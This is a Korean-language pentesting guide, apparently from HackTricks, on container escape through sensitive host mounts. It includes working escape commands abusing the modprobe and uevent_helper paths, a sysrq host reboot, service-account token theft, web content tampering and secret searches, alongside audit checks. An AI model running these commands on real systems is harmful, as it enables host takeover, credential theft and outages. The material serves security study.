# 민감한 호스트 마운트

{{#include ../../../banners/hacktricks-training.md}}

## 개요

호스트 마운트는 종종 엄격히 격리된 프로세스 뷰를 호스트 리소스의 직접적인 가시성으로 되돌리기 때문에 실무에서 가장 중요한 container-escape 표면 중 하나입니다. 위험한 경우는 `/`에만 국한되지 않습니다. `/proc`, `/sys`, `/var`의 bind mount, runtime sockets, kubelet-managed 상태, 또는 장치 관련 경로의 노출은 kernel 제어, 자격 증명, 인접한 container 파일시스템, 런타임 관리 인터페이스를 드러낼 수 있습니다.

이 페이지는 개별 보호 페이지와 별도로 존재합니다. 그 이유는 오용 모델이 여러 방면에 걸쳐 있기 때문입니다. 쓰기 가능한 호스트 마운트는 mount namespaces, user namespaces, AppArmor 또는 SELinux 적용 범위, 그리고 정확히 어떤 호스트 경로가 노출되었는지 등 여러 요인으로 인해 위험합니다. 이를 독립적인 주제로 취급하면 공격 표면을 이해하기가 훨씬 쉬워집니다.

## `/proc` 노출

procfs는 일반적인 프로세스 정보와 고영향의 kernel 제어 인터페이스를 모두 포함합니다. `-v /proc:/host/proc`와 같은 bind mount나 예상치 못한 쓰기 가능한 proc 항목을 노출하는 컨테이너 뷰는 정보 유출, 서비스 거부, 또는 직접적인 호스트 코드 실행으로 이어질 수 있습니다.

가치가 높은 procfs 경로는 다음과 같습니다:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### 악용

우선 어떤 가치 높은 procfs 항목들이 보이거나 쓰기 가능한지 확인하세요:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
These paths are interesting for different reasons. `core_pattern`, `modprobe`, and `binfmt_misc` can become host code-execution paths when writable. `kallsyms`, `kmsg`, `kcore`, and `config.gz` are powerful reconnaissance sources for kernel exploitation. `sched_debug` and `mountinfo` reveal process, cgroup, and filesystem context that can help reconstruct the host layout from inside the container.

이러한 경로들은 각각 다른 이유로 흥미롭다. `core_pattern`, `modprobe`, 그리고 `binfmt_misc`는 쓰기 가능할 경우 호스트 코드 실행 경로가 될 수 있다. `kallsyms`, `kmsg`, `kcore`, 그리고 `config.gz`는 kernel exploitation에 유용한 강력한 정찰 소스이다. `sched_debug`와 `mountinfo`는 프로세스, cgroup, 및 파일시스템 컨텍스트를 노출하여 컨테이너 내부에서 호스트 레이아웃을 재구성하는 데 도움이 될 수 있다.

The practical value of each path is different, and treating them all as if they had the same impact makes triage harder:

각 경로의 실질적 가치는 다르며, 모든 경로를 같은 영향력을 가진 것처럼 취급하면 우선순위 결정이 더 어려워진다:

- `/proc/sys/kernel/core_pattern`
If writable, this is one of the highest-impact procfs paths because the kernel will execute a pipe handler after a crash. A container that can point `core_pattern` at a payload stored in its overlay or in a mounted host path can often obtain host code execution. See also [read-only-paths.md](protections/read-only-paths.md) for a dedicated example.
- `/proc/sys/kernel/core_pattern`
쓰기 가능할 경우, 충돌(crash) 후 kernel이 파이프 핸들러를 실행하기 때문에 가장 영향력 높은 procfs 경로 중 하나다. 컨테이너가 `core_pattern`을 자신의 `overlay`에 저장된 페이로드나 마운트된 호스트 경로의 페이로드로 지정할 수 있다면 종종 호스트 코드 실행을 얻을 수 있다. 전용 예제는 [read-only-paths.md](protections/read-only-paths.md)를 참조하라.

- `/proc/sys/kernel/modprobe`
This path controls the userspace helper used by the kernel when it needs to invoke module-loading logic. If writable from the container and interpreted in the host context, it can become another host code-execution primitive. It is especially interesting when combined with a way to trigger the helper path.
- `/proc/sys/kernel/modprobe`
이 경로는 kernel이 module-loading 로직을 호출할 때 사용하는 userspace helper를 제어한다. 컨테이너에서 쓰기 가능하고 호스트 컨텍스트에서 해석되면 또 다른 호스트 코드 실행 프리미티브가 될 수 있다. helper 경로를 트리거하는 방법과 결합되면 특히 흥미롭다.

- `/proc/sys/vm/panic_on_oom`
This is not usually a clean escape primitive, but it can convert memory pressure into host-wide denial of service by turning OOM conditions into kernel panic behavior.
- `/proc/sys/vm/panic_on_oom`
보통 깔끔한 이스케이프 프리미티브는 아니지만, 메모리 압박을 OOM 조건을 kernel panic으로 전환시켜 호스트 전체의 서비스 거부(denial of service)로 바꿀 수 있다.

- `/proc/sys/fs/binfmt_misc`
If the registration interface is writable, the attacker may register a handler for a chosen magic value and obtain host-context execution when a matching file is executed.
- `/proc/sys/fs/binfmt_misc`
등록 인터페이스가 쓰기 가능하면, 공격자가 선택한 magic 값에 대한 핸들러를 등록하고 일치하는 파일이 실행될 때 호스트 컨텍스트에서 실행을 얻을 수 있다.

- `/proc/config.gz`
Useful for kernel exploit triage. It helps determine which subsystems, mitigations, and optional kernel features are enabled without needing host package metadata.
- `/proc/config.gz`
kernel exploit의 우선순위 결정(triage)에 유용하다. 호스트 패키지 메타데이터 없이도 어떤 서브시스템, 완화(mitigation), 및 선택적 kernel 기능들이 활성화되어 있는지 파악하는 데 도움이 된다.

- `/proc/sysrq-trigger`
Mostly a denial-of-service path, but a very serious one. It can reboot, panic, or otherwise disrupt the host immediately.
- `/proc/sysrq-trigger`
대부분 서비스 거부 경로이지만 매우 심각하다. 즉시 호스트를 재부팅, panic 또는 기타 방식으로 중단시킬 수 있다.

- `/proc/kmsg`
Reveals kernel ring buffer messages. Useful for host fingerprinting, crash analysis, and in some environments for leaking information helpful to kernel exploitation.
- `/proc/kmsg`
kernel ring buffer 메시지를 노출한다. 호스트 fingerprinting, crash 분석에 유용하며 일부 환경에서는 kernel exploitation에 도움되는 정보를 leak하는 데 사용될 수 있다.

- `/proc/kallsyms`
Valuable when readable because it exposes exported kernel symbol information and may help defeat address randomization assumptions during kernel exploit development.
- `/proc/kallsyms`
읽을 수 있으면 유용하다. export된 kernel 심볼 정보를 노출하고 kernel exploit 개발 중 주소 무작위화(address randomization) 가정을 무력화하는 데 도움이 될 수 있다.

- `/proc/[pid]/mem`
This is a direct process-memory interface. If the target process is reachable with the necessary ptrace-style conditions, it may allow reading or modifying another process's memory. The realistic impact depends heavily on credentials, `hidepid`, Yama, and ptrace restrictions, so it is a powerful but conditional path.
- `/proc/[pid]/mem`
직접적인 프로세스 메모리 인터페이스다. 대상 프로세스가 필요한 ptrace-style 조건으로 접근 가능하다면 다른 프로세스의 메모리를 읽거나 수정할 수 있다. 현실적 영향은 자격 증명, `hidepid`, Yama, ptrace 제한에 크게 좌우되므로 강력하지만 조건부인 경로다.

- `/proc/kcore`
Exposes a core-image-style view of system memory. The file is huge and awkward to use, but if it is meaningfully readable it indicates a badly exposed host memory surface.
- `/proc/kcore`
시스템 메모리의 core-image 스타일 뷰를 노출한다. 파일이 매우 크고 다루기 불편하지만, 의미 있게 읽을 수 있다면 호스트 메모리 표면이 심하게 노출되어 있음을 나타낸다.

- `/proc/kmem` and `/proc/mem`
Historically high-impact raw memory interfaces. On many modern systems they are disabled or heavily restricted, but if present and usable they should be treated as critical findings.
- `/proc/kmem` 및 `/proc/mem`
역사적으로 높은 영향도의 원시 메모리 인터페이스다. 많은 최신 시스템에서 비활성화되거나 강하게 제한되어 있지만, 존재하고 사용 가능하다면 치명적인 발견으로 취급해야 한다.

- `/proc/sched_debug`
Leaks scheduling and task information that may expose host process identities even when other process views look cleaner than expected.
- `/proc/sched_debug`
스케줄링 및 태스크 정보를 leak하여 다른 프로세스 뷰가 예상보다 깨끗해 보여도 호스트 프로세스 정체를 드러낼 수 있다.

- `/proc/[pid]/mountinfo`
Extremely useful for reconstructing where the container really lives on the host, which paths are overlay-backed, and whether a writable mount corresponds to host content or only to the container layer.
- `/proc/[pid]/mountinfo`
컨테이너가 실제로 호스트의 어디에 위치하는지, 어떤 경로가 overlay-backed인지, 그리고 쓰기 가능한 마운트가 호스트 콘텐츠에 해당하는지 아니면 컨테이너 레이어에만 해당하는지 재구성하는 데 매우 유용하다.

If `/proc/[pid]/mountinfo` or overlay details are readable, use them to recover the host path of the container filesystem:
만약 `/proc/[pid]/mountinfo` 또는 overlay 세부 정보가 읽을 수 있다면, 이를 사용해 컨테이너 파일시스템의 호스트 경로를 복구하라:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
These commands are useful because a number of host-execution tricks require turning a path inside the container into the corresponding path from the host's point of view.

### 전체 예시: `modprobe` Helper Path Abuse

만약 `/proc/sys/kernel/modprobe`가 container에서 쓰기 가능하고 helper path가 host context에서 해석된다면, 이것은 attacker-controlled payload로 리디렉션될 수 있습니다:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
정확한 트리거는 대상과 커널 동작에 따라 달라지지만, 중요한 점은 쓰기 가능한 helper 경로가 이후의 커널 helper 호출을 공격자가 제어하는 호스트 경로의 내용으로 리디렉션할 수 있다는 것이다.

### 전체 예제: `kallsyms`, `kmsg`, 그리고 `config.gz`로 Kernel Recon

목표가 즉각적인 탈출이 아니라 익스플로잇 가능성 평가라면:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
이 명령들은 유용한 심볼 정보가 보이는지, 최근 커널 메시지가 흥미로운 상태를 드러내는지, 그리고 어떤 커널 기능이나 완화책이 컴파일되어 있는지를 확인하는 데 도움됩니다. 영향은 보통 직접적인 탈출을 의미하지 않지만, 커널 취약점 분류를 크게 단축할 수 있습니다.

### 전체 예제: SysRq Host Reboot

만약 `/proc/sysrq-trigger`가 쓰기 가능하며 호스트에 노출되어 있다면:
```bash
echo b > /proc/sysrq-trigger
```
효과는 즉시 host 재부팅을 일으킵니다. 미묘한 사례는 아니지만, procfs 노출이 단순한 정보 공개보다 훨씬 더 심각할 수 있음을 분명히 보여줍니다.

## `/sys` 노출

sysfs는 많은 양의 kernel 및 device 상태를 노출합니다. 일부 sysfs 경로는 주로 fingerprinting에 유용하지만, 다른 경로들은 helper 실행, device 동작, security-module 구성 또는 firmware 상태에 영향을 줄 수 있습니다.

High-value sysfs paths include:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

이 경로들은 각기 다른 이유로 중요합니다. `/sys/class/thermal`은 thermal-management 동작에 영향을 주어 노출이 심한 환경에서는 host 안정성에 영향을 미칠 수 있습니다. `/sys/kernel/vmcoreinfo`는 crash-dump 및 kernel-layout 정보를 leak할 수 있어 low-level host fingerprinting에 도움이 됩니다. `/sys/kernel/security`는 Linux Security Modules에서 사용하는 `securityfs` 인터페이스이므로, 그곳에 대한 예상치 못한 접근은 MAC-related 상태를 노출하거나 변경할 수 있습니다. EFI variable 경로는 firmware-backed boot 설정에 영향을 줄 수 있어 일반 설정 파일보다 훨씬 더 심각합니다. `/sys/kernel/debug` 아래의 `debugfs`는 의도적으로 개발자용 인터페이스로 설계되어 있어 hardened production-facing kernel APIs보다 안전성 보장 기대치가 훨씬 낮기 때문에 특히 위험합니다.

이 경로들을 검토할 때 유용한 명령은 다음과 같습니다:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
What makes those commands interesting:

- `/sys/kernel/security`는 AppArmor, SELinux 또는 다른 LSM 표면이 호스트 전용으로 남아 있어야 할 방식으로 노출되어 있는지 드러낼 수 있다.
- `/sys/kernel/debug`는 이 그룹에서 가장 우려스러운 발견인 경우가 많다. `debugfs`가 마운트되어 읽기 또는 쓰기가 가능하면, 활성화된 debug 노드에 따라 위험이 달라지는 광범위한 커널 관련 표면이 존재한다고 봐야 한다.
- EFI 변수 노출은 덜 흔하지만, 존재할 경우 일반 런타임 파일이 아닌 펌웨어 기반 설정을 건드리기 때문에 높은 영향도를 가진다.
- `/sys/class/thermal`은 주로 호스트 안정성 및 하드웨어 상호작용과 관련되며, 깔끔한 쉘 방식의 탈출과는 큰 관련이 없다.
- `/sys/kernel/vmcoreinfo`는 주로 호스트 지문 식별 및 크래시 분석의 소스로, 저수준 커널 상태를 이해하는 데 유용하다.

### Full Example: `uevent_helper`

If `/sys/kernel/uevent_helper` is writable, the kernel may execute an attacker-controlled helper when a `uevent` is triggered:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
The reason this works is that the helper path is interpreted from the host's point of view. Once triggered, the helper runs in the host context rather than inside the current container.

## `/var` 노출

호스트의 `/var`를 컨테이너에 마운트하는 것은 `/`를 마운트하는 것만큼 극적으로 보이지 않기 때문에 종종 과소평가됩니다. 실제로는 런타임 소켓(runtime sockets), 컨테이너 스냅샷 디렉터리(container snapshot directories), kubelet-managed pod 볼륨, projected service-account tokens, 그리고 인접 애플리케이션 파일시스템에 접근하기에 충분할 수 있습니다. 최신 노드에서는 `/var`가 실제로 가장 운영상 흥미로운 컨테이너 상태가 저장되는 장소인 경우가 많습니다.

### Kubernetes 예시

`hostPath: /var`가 설정된 pod는 종종 다른 pod들의 projected tokens와 overlay snapshot 콘텐츠를 읽을 수 있습니다:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
이 명령어들은 mount가 단순한 애플리케이션 데이터만 노출하는지, 아니면 영향력이 큰 클러스터 자격증명(cluster credentials)을 노출하는지를 알려주기 때문에 유용합니다. 읽을 수 있는 service-account token은 로컬 코드 실행(local code execution)을 즉시 Kubernetes API 접근으로 바꿀 수 있습니다.

token이 존재한다면, token 발견에서 멈추지 말고 그것이 무엇에 접근할 수 있는지 검증하세요:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
여기서 영향은 로컬 노드 접근보다 훨씬 클 수 있습니다. 광범위한 RBAC 권한을 가진 토큰은 마운트된 `/var`를 통해 클러스터 전체를 침해할 수 있습니다.

### Docker 및 containerd 예시

Docker 호스트에서는 관련 데이터가 종종 `/var/lib/docker`에 있으며, containerd 기반 Kubernetes 노드에서는 `/var/lib/containerd` 또는 snapshotter별 경로에 있을 수 있습니다:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
만약 마운트된 `/var`가 다른 워크로드의 쓰기 가능한 snapshot 내용을 노출한다면, 공격자는 현재 container 구성을 건드리지 않고도 애플리케이션 파일을 변경하거나 웹 콘텐츠를 심거나 시작 스크립트를 수정할 수 있습니다.

쓰기 가능한 snapshot 내용이 발견되었을 때의 구체적 악용 아이디어:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
이 명령들은 마운트된 `/var`에서 나타나는 세 가지 주요 영향( application tampering, secret recovery, and lateral movement into neighboring workloads )을 보여주기 때문에 유용합니다.

## 런타임 소켓

민감한 호스트 마운트는 전체 디렉터리 대신 런타임 소켓을 포함하는 경우가 많습니다. 이것들은 매우 중요하므로 여기서 명시적으로 다시 언급할 가치가 있습니다:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
이 소켓들 중 하나가 마운트된 후 전체 익스플로잇 흐름은 [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md)에서 확인하세요.

빠른 첫 상호작용 패턴:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
If one of these succeeds, the path from "mounted socket" to "start a more privileged sibling container" is usually much shorter than any kernel breakout path.

## 마운트 관련 CVEs

호스트 마운트는 런타임 취약성과도 교차합니다. 중요한 최근 예시는 다음과 같습니다:

- `CVE-2024-21626` in `runc`, where a leaked directory file descriptor could place the working directory on the host filesystem.
- `CVE-2024-23651` and `CVE-2024-23653` in BuildKit, where OverlayFS copy-up races could produce host-path writes during builds.
- `CVE-2024-1753` in Buildah and Podman build flows, where crafted bind mounts during build could expose `/` read-write.
- `CVE-2024-40635` in containerd, where a large `User` value could overflow into UID 0 behavior.

이 CVE들은 마운트 처리 문제가 단지 운영자 구성만의 문제가 아님을 보여주기 때문에 중요합니다. 런타임 자체가 마운트로 유발되는 escape 조건을 도입할 수도 있습니다.

## 점검

다음 명령어들을 사용해 가장 영향도가 큰 마운트 노출을 빠르게 찾아보세요:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
- 호스트 루트, `/proc`, `/sys`, `/var`, 그리고 런타임 소켓은 모두 우선순위가 높은 발견사항입니다.
- 쓰기 가능한 proc/sys 항목은 종종 마운트가 안전한 컨테이너 뷰가 아니라 호스트 전역의 커널 제어를 노출하고 있음을 의미합니다.
- 마운트된 `/var` 경로는 파일시스템 리뷰뿐만 아니라 자격 증명 및 인접 워크로드 검토가 필요합니다.
